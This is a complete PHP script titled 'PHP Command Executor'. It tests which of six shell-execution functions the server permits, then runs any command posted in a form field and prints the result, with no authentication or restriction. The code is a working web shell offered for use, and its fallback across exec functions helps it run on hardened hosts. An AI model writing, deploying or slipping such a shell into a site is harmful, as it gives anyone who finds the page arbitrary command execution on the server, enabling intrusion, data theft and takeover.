<?php
// Helper: test all available functions once
function detect_executor() {
    $testCmd = "echo EXEC_TEST";
    $executors = [];

    // 1️⃣ shell_exec
    if (function_exists('shell_exec')) {
        $output = @shell_exec($testCmd);
        if (strpos($output, "EXEC_TEST") !== false) $executors['shell_exec'] = true;
    }

    // 2️⃣ exec
    if (function_exists('exec')) {
        $arr = []; $status = 1;
        @exec($testCmd, $arr, $status);
        if ($status === 0 && in_array("EXEC_TEST", $arr)) $executors['exec'] = true;
    }

    // 3️⃣ system
    if (function_exists('system')) {
        ob_start();
        @system($testCmd, $status);
        $out = ob_get_clean();
        if ($status === 0 && strpos($out, "EXEC_TEST") !== false) $executors['system'] = true;
    }

    // 4️⃣ passthru
    if (function_exists('passthru')) {
        ob_start();
        @passthru($testCmd, $status);
        $out = ob_get_clean();
        if ($status === 0 && strpos($out, "EXEC_TEST") !== false) $executors['passthru'] = true;
    }

    // 5️⃣ proc_open
    if (function_exists('proc_open')) {
        $descriptors = [1 => ['pipe','w'], 2 => ['pipe','w']];
        $process = @proc_open($testCmd, $descriptors, $pipes);
        if (is_resource($process)) {
            $out = stream_get_contents($pipes[1]);
            fclose($pipes[1]); fclose($pipes[2]);
            proc_close($process);
            if (strpos($out, "EXEC_TEST") !== false) $executors['proc_open'] = true;
        }
    }

    // 6️⃣ popen
    if (function_exists('popen')) {
        $handle = @popen($testCmd, 'r');
        if ($handle) {
            $out = stream_get_contents($handle);
            pclose($handle);
            if (strpos($out, "EXEC_TEST") !== false) $executors['popen'] = true;
        }
    }

    return array_keys($executors); // return list of working executors
}

// Run command using first available executor
function run_cmd($cmd, $executor) {
    switch ($executor) {
        case 'shell_exec':
            return @shell_exec($cmd);

        case 'exec':
            $arr = []; $status = 1;
            @exec($cmd, $arr, $status);
            return $status === 0 ? implode("\n", $arr) : "Failed";

        case 'system':
            ob_start();
            @system($cmd, $status);
            $out = ob_get_clean();
            return $status === 0 ? $out : "Failed";

        case 'passthru':
            ob_start();
            @passthru($cmd, $status);
            $out = ob_get_clean();
            return $status === 0 ? $out : "Failed";

        case 'proc_open':
            $descriptors = [1 => ['pipe','w'], 2 => ['pipe','w']];
            $process = @proc_open($cmd, $descriptors, $pipes);
            if (is_resource($process)) {
                $out = stream_get_contents($pipes[1]);
                fclose($pipes[1]); fclose($pipes[2]);
                proc_close($process);
                return $out;
            }
            return "Failed";

        case 'popen':
            $handle = @popen($cmd, 'r');
            if ($handle) {
                $out = stream_get_contents($handle);
                pclose($handle);
                return $out;
            }
            return "Failed";

        default:
            return "No executor available";
    }
}

// Detect once
$availableExecutors = detect_executor();
$chosenExecutor = $availableExecutors[0] ?? null;

$output = "";
if (isset($_POST['cmd']) && $chosenExecutor) {
    $output = run_cmd($_POST['cmd'], $chosenExecutor);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>PHP Command Executor</title>
    <style>
        body { font-family: monospace; background: #111; color: #eee; }
        input[type=text] { width: 80%; padding: 8px; background: #222; color: #eee; border: 1px solid #555; }
        input[type=submit] { padding: 8px 16px; background: #444; color: #eee; border: 1px solid #555; cursor: pointer; }
        pre { background: #222; padding: 10px; border: 1px solid #555; margin-top: 10px; }
    </style>
</head>
<body>
    <h2>PHP Command Executor</h2>
    <p><strong>Working executors:</strong> <?php echo implode(", ", $availableExecutors) ?: "None"; ?></p>
    <p><strong>Using:</strong> <?php echo $chosenExecutor ?: "No executor available"; ?></p>

    <form method="post">
        <input type="text" name="cmd" placeholder="Enter command" autofocus>
        <input type="submit" value="Run">
    </form>

    <?php if (!empty($output)): ?>
        <h3>Output:</h3>
        <pre><?php echo htmlspecialchars($output); ?></pre>
    <?php endif; ?>
</body>
</html>
